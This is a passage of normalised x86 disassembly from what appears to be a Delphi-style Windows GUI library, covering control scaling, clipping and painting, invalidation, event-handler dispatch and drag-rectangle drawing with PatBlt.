mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_4244f0
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_42450c
sub_448d94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_448e2a
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_421290
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_448fac
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4042c4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448e31
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_448fdc
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_448e38
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_448e80
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
test esi esi
je r-xdata
mov edx ebx
call sub_44c450
mov edx ebx
mov eax esi
call sub_44c37c
mov eax ebx
call sub_4485d8
sub_448ecc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403324
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_44a198
mov eax edi
mov si 0xffd0
call sub_403324
sub_448f64
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_45d7f0
mov edx ebx
mov eax esi
call sub_420e08
sub_448f88
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_44a198
pop ebx
retn
sub_448fac
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_448f20
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_403fa8
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_448f30
sub_448fdc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_449031
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4042c4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449038
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax esi
call sub_404378
mov edx eax
mov eax ebx
call sub_448f88
sub_44905c
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_42444c
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_44a198
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_42444c
mov [ ebx + 0x84 ] eax
sub_4491e4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4491d4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_446150
mov eax esi
call sub_446150
jmp r-xdata
sub_44921c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_41875c
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4185f0
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_41877c
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4493f4
mov eax ebx
call sub_460800
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403324
sub_44929c
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_44921c
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_44921c
jmp r-xdata
sub_4492c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_449356
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44935d
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
sub_449368
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_41875c
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_418700
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_44894c
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4493f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44fadc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44894c
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44f7d8
push eax
call InvalidateRect
push ebp
call sub_449368
pop ecx
test al al
je r-xdata
mov al 0x1
sub_449490
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4607d8
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_44a198
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403324
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4494dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
mov dl 0x1
mov eax ebx
call sub_448ecc
test [ ebx + 0x51 ] 0x4
je r-xdata
pop esi
pop ebx
retn
sub_44952c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44fadc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44f7d8
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_449605
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_44d5e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44f7d8
push eax
call ReleaseDC
retn
sub_44968c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax edi
call sub_44a1cc
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_448af0
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b90
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_44a198
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_4472d4
sub_449760
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_44979c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4497e8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_449814
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_448f50
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_448f3c
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_40292c
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_40292c
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_44f7d8
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_4498f8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_449944
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403324
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403324
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_449a08
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_449a54
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_449aa0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_449bbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_424a6c
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449bc2
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_449bf4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_448af0
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403324
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403324
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403324
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403324
jmp r-xdata
sub_449ce4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_417088
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_44a1cc
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_448f3c
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_448f50
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_4170ec
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_449ec4
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_448ac4
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403324
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_44f7d8
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_446698
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_449eaf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_44f7d8
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_44f7d8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44894c
test esi esi
je r-xdata
sub_449ec4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403324
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_44ad48
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403324
mov eax esi
call sub_4489f4
push eax
lea eax [ esp + 0x14 ]
